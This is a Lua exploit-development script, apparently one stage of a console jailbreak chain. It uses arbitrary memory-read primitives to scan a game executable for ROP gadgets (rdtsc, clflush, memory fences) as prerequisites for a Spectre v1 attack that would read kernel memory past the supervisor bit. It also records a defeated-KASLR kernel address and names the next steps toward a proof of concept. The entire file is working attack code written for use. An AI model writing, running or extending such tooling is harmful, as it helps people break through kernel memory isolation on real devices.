-- CRASH_CLASS: LOW
-- PROBE 1199d: Spectre v1 prerequisites — scan eboot for timing/cache gadgets
--
-- Context: KASLR defeated (kernel at 0xFFFFFFFFD4000000, no KPTI).
-- For Spectre v1 we need:
--   1. rdtsc (0F 31) — high-resolution timer
--   2. clflush (0F AE /7 = 0F AE 38..3F) — cache line flush
--   3. lfence (0F AE E8) or mfence (0F AE F0) — serialization
--   4. rdtscp (0F 01 F9) — serializing rdtsc variant
--
-- Eboot .text is RX (readable). Scan for these instruction sequences.
-- Also test: can a child thread execute rdtsc via ROP?

print("=== PROBE 1199d: Spectre v1 prerequisites ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Get eboot base from dynlib_get_info
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end) -- handle 0 = eboot

local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
local text_size_lo = safe_rd(info + 0x110)
local text_size_hi = safe_rd(info + 0x114)

if not text_lo or not text_hi then
    print("FATAL: cannot get eboot base")
    return
end

local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
local eboot_size = text_size_lo + (text_size_hi or 0) * 0x100000000
print(string.format("eboot .text base: 0x%X%08X  size: 0x%X", text_hi, text_lo, eboot_size))
print("")

-- Limit scan to reasonable range (first 6MB or actual size)
local scan_size = math.min(eboot_size, 6 * 1024 * 1024)
print(string.format("Scanning %d bytes (%.1f MB) of eboot .text ...", scan_size, scan_size / 1048576))
print("")

-- =============================================================
-- SECTION A: Scan for instruction sequences
-- =============================================================
print("--- SECTION A: Gadget scan ---")

local gadgets = {
    rdtsc = {},        -- 0F 31
    rdtsc_ret = {},    -- 0F 31 C3
    rdtscp = {},       -- 0F 01 F9
    rdtscp_ret = {},   -- 0F 01 F9 C3
    clflush = {},      -- 0F AE 38..3F (clflush [reg])
    clflush_rdi_ret = {}, -- 0F AE 3F C3 (clflush [rdi]; ret)
    lfence = {},       -- 0F AE E8
    lfence_ret = {},   -- 0F AE E8 C3
    mfence = {},       -- 0F AE F0
    mfence_ret = {},   -- 0F AE F0 C3
    prefetch = {},     -- 0F 18 (prefetchnta/t0/t1/t2)
    cpuid_ret = {},    -- 0F A2 C3 (cpuid; ret — serializing)
}

-- Read 4 bytes at a time for speed
local MAX_HITS = 20  -- limit per gadget type

for off = 0, scan_size - 4, 1 do
    local addr = eboot_base + uint64(off)
    local dw = safe_rd(addr)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- rdtsc = 0F 31
        if b0 == 0x0F and b1 == 0x31 then
            if #gadgets.rdtsc < MAX_HITS then
                table.insert(gadgets.rdtsc, off)
            end
            if b2 == 0xC3 and #gadgets.rdtsc_ret < MAX_HITS then
                table.insert(gadgets.rdtsc_ret, off)
            end
        end

        -- rdtscp = 0F 01 F9
        if b0 == 0x0F and b1 == 0x01 and b2 == 0xF9 then
            if #gadgets.rdtscp < MAX_HITS then
                table.insert(gadgets.rdtscp, off)
            end
            if b3 == 0xC3 and #gadgets.rdtscp_ret < MAX_HITS then
                table.insert(gadgets.rdtscp_ret, off)
            end
        end

        -- clflush = 0F AE /7 (modrm 38..3F = [reg] forms)
        if b0 == 0x0F and b1 == 0xAE then
            local modrm = b2
            local reg = math.floor(modrm / 8) % 8
            if reg == 7 then  -- /7 = clflush
                if #gadgets.clflush < MAX_HITS then
                    table.insert(gadgets.clflush, off)
                end
                -- clflush [rdi]; ret = 0F AE 3F C3
                if modrm == 0x3F and b3 == 0xC3 then
                    if #gadgets.clflush_rdi_ret < MAX_HITS then
                        table.insert(gadgets.clflush_rdi_ret, off)
                    end
                end
            end
        end

        -- lfence = 0F AE E8
        if b0 == 0x0F and b1 == 0xAE and b2 == 0xE8 then
            if #gadgets.lfence < MAX_HITS then
                table.insert(gadgets.lfence, off)
            end
            if b3 == 0xC3 and #gadgets.lfence_ret < MAX_HITS then
                table.insert(gadgets.lfence_ret, off)
            end
        end

        -- mfence = 0F AE F0
        if b0 == 0x0F and b1 == 0xAE and b2 == 0xF0 then
            if #gadgets.mfence < MAX_HITS then
                table.insert(gadgets.mfence, off)
            end
            if b3 == 0xC3 and #gadgets.mfence_ret < MAX_HITS then
                table.insert(gadgets.mfence_ret, off)
            end
        end

        -- cpuid; ret = 0F A2 C3
        if b0 == 0x0F and b1 == 0xA2 and b2 == 0xC3 then
            if #gadgets.cpuid_ret < MAX_HITS then
                table.insert(gadgets.cpuid_ret, off)
            end
        end

        -- prefetch = 0F 18 /0../3
        if b0 == 0x0F and b1 == 0x18 then
            local modrm = b2
            local reg = math.floor(modrm / 8) % 8
            if reg >= 0 and reg <= 3 then
                if #gadgets.prefetch < MAX_HITS then
                    table.insert(gadgets.prefetch, off)
                end
            end
        end
    end

    -- Progress every 1MB
    if off % (1024 * 1024) == 0 and off > 0 then
        print(string.format("  scanned %d MB ...", off / 1048576))
    end
end

print("")
print("=== GADGET RESULTS ===")
for name, hits in pairs(gadgets) do
    if #hits > 0 then
        local offsets = {}
        for i = 1, math.min(#hits, 10) do
            table.insert(offsets, string.format("+0x%X", hits[i]))
        end
        local suffix = ""
        if #hits > 10 then suffix = " ..." end
        print(string.format("  %-20s %d hits: %s%s", name, #hits, table.concat(offsets, ", "), suffix))
    else
        print(string.format("  %-20s NONE", name))
    end
end
print("")

-- =============================================================
-- SECTION B: Verify rdtsc bytes at found offsets
-- =============================================================
print("--- SECTION B: Verify rdtsc gadgets ---")

local best_rdtsc = nil
local best_rdtsc_type = nil

-- Check rdtsc;ret first (ideal)
for _, off in ipairs(gadgets.rdtsc_ret) do
    local addr = eboot_base + uint64(off)
    local b0_val = safe_rd(addr)
    if b0_val then
        local b0 = b0_val % 256
        local b1 = math.floor(b0_val / 256) % 256
        local b2 = math.floor(b0_val / 65536) % 256
        print(string.format("  rdtsc;ret at +0x%X: bytes %02X %02X %02X", off, b0, b1, b2))
        if b0 == 0x0F and b1 == 0x31 and b2 == 0xC3 then
            if not best_rdtsc then
                best_rdtsc = off
                best_rdtsc_type = "rdtsc;ret"
            end
        end
    end
end

-- If no rdtsc;ret, look for rdtsc followed by other useful instructions
if not best_rdtsc and #gadgets.rdtsc > 0 then
    for _, off in ipairs(gadgets.rdtsc) do
        local addr = eboot_base + uint64(off)
        -- Read 8 bytes to see what follows
        local dw1 = safe_rd(addr)
        local dw2 = safe_rd(addr + uint64(4))
        if dw1 and dw2 then
            local bytes = {}
            for i = 0, 3 do
                table.insert(bytes, math.floor(dw1 / (256^i)) % 256)
            end
            for i = 0, 3 do
                table.insert(bytes, math.floor(dw2 / (256^i)) % 256)
            end
            local hex = {}
            for _, b in ipairs(bytes) do table.insert(hex, string.format("%02X", b)) end
            print(string.format("  rdtsc at +0x%X: %s", off, table.concat(hex, " ")))

            -- Look for rdtsc; shl rdx,32; or rax,rdx; ret pattern
            -- Or rdtsc; mov [rdi],eax; mov [rdi+4],edx; ret
            -- Any rdtsc followed by a ret within 16 bytes is usable
        end
    end
end

if best_rdtsc then
    print(string.format("\nBEST rdtsc gadget: +0x%X (%s)", best_rdtsc, best_rdtsc_type))
else
    print("\nNo ideal rdtsc;ret gadget found. Check raw rdtsc hits above.")
end

-- =============================================================
-- SECTION C: Check for REX-prefixed variants (48 0F 31 etc)
-- =============================================================
print("")
print("--- SECTION C: REX-prefixed timing gadget scan ---")

-- On x86-64, rdtsc doesn't need REX but the scan might miss sequences
-- where the 0F 31 is at an odd alignment. Also check for:
-- rdtsc result is in EDX:EAX. To use in ROP we need:
--   rdtsc; shl rdx,32; or rax,rdx; ret  (combines into rax)
--   rdtsc; mov [rdi],eax; ret  (stores low 32 bits)

-- Quick scan for "shl rdx,0x20" = 48 C1 E2 20
local shl_rdx_32 = {}
for off = 0, scan_size - 4, 1 do
    local addr = eboot_base + uint64(off)
    local dw = safe_rd(addr)
    if dw then
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256
        if b0 == 0x48 and b1 == 0xC1 and b2 == 0xE2 and b3 == 0x20 then
            if #shl_rdx_32 < 5 then
                table.insert(shl_rdx_32, off)
            end
        end
    end
end

if #shl_rdx_32 > 0 then
    for _, off in ipairs(shl_rdx_32) do
        print(string.format("  shl rdx,32 at +0x%X", off))
    end
else
    print("  No shl rdx,32 found")
end

-- =============================================================
-- SECTION D: Test clflush availability
-- =============================================================
print("")
print("--- SECTION D: clflush gadgets ---")

for _, off in ipairs(gadgets.clflush) do
    local addr = eboot_base + uint64(off)
    local dw = safe_rd(addr)
    if dw then
        local bytes = {}
        for i = 0, 3 do
            table.insert(bytes, string.format("%02X", math.floor(dw / (256^i)) % 256))
        end
        -- Also read next dword for context
        local dw2 = safe_rd(addr + uint64(4))
        if dw2 then
            for i = 0, 3 do
                table.insert(bytes, string.format("%02X", math.floor(dw2 / (256^i)) % 256))
            end
        end
        print(string.format("  clflush at +0x%X: %s", off, table.concat(bytes, " ")))
    end
end

if #gadgets.clflush_rdi_ret > 0 then
    print(string.format("\n  IDEAL: clflush [rdi]; ret at +0x%X", gadgets.clflush_rdi_ret[1]))
end

-- =============================================================
-- SECTION E: Kernel KASLR recap
-- =============================================================
print("")
print("--- SECTION E: Kernel location (from KASLR defeat) ---")
print("  Kernel image: 0xFFFFFFFFD4000000 (102 MB, slide +0x54000000)")
print("  Stub: 0xFFFFFFFFC0000000 (2 MB)")
print("  No KPTI: kernel pages present in userland page tables")
print("  Supervisor bit enforced: content unreadable via direct access")
print("  Spectre v1 target: speculatively read past supervisor bit")
print("")

-- =============================================================
-- SECTION F: Summary
-- =============================================================
print("--- SECTION F: Prerequisites summary ---")

local has_rdtsc = #gadgets.rdtsc > 0
local has_rdtsc_ret = #gadgets.rdtsc_ret > 0
local has_clflush = #gadgets.clflush > 0
local has_clflush_rdi_ret = #gadgets.clflush_rdi_ret > 0
local has_lfence = #gadgets.lfence > 0
local has_mfence = #gadgets.mfence > 0

print(string.format("  rdtsc:          %s (%d hits)", has_rdtsc and "YES" or "NO", #gadgets.rdtsc))
print(string.format("  rdtsc;ret:      %s (%d hits)", has_rdtsc_ret and "YES" or "NO", #gadgets.rdtsc_ret))
print(string.format("  rdtscp:         %s (%d hits)", #gadgets.rdtscp > 0 and "YES" or "NO", #gadgets.rdtscp))
print(string.format("  clflush:        %s (%d hits)", has_clflush and "YES" or "NO", #gadgets.clflush))
print(string.format("  clflush [rdi];ret: %s (%d hits)", has_clflush_rdi_ret and "YES" or "NO", #gadgets.clflush_rdi_ret))
print(string.format("  lfence:         %s (%d hits)", has_lfence and "YES" or "NO", #gadgets.lfence))
print(string.format("  lfence;ret:     %s (%d hits)", #gadgets.lfence_ret > 0 and "YES" or "NO", #gadgets.lfence_ret))
print(string.format("  mfence:         %s (%d hits)", has_mfence and "YES" or "NO", #gadgets.mfence))
print(string.format("  mfence;ret:     %s (%d hits)", #gadgets.mfence_ret > 0 and "YES" or "NO", #gadgets.mfence_ret))
print(string.format("  cpuid;ret:      %s (%d hits)", #gadgets.cpuid_ret > 0 and "YES" or "NO", #gadgets.cpuid_ret))

local spectre_ready = has_rdtsc and has_clflush
print("")
if spectre_ready then
    print("SPECTRE V1 PREREQUISITES: AVAILABLE")
    print("Next: build flush+reload timing test, then Spectre v1 PoC")
else
    local missing = {}
    if not has_rdtsc then table.insert(missing, "rdtsc") end
    if not has_clflush then table.insert(missing, "clflush") end
    print("SPECTRE V1 PREREQUISITES: MISSING " .. table.concat(missing, ", "))
    print("Without clflush: try clflushopt (66 0F AE /7) or PRIME+PROBE instead of FLUSH+RELOAD")
end

print("")
print("=== PROBE 1199d COMPLETE ===")
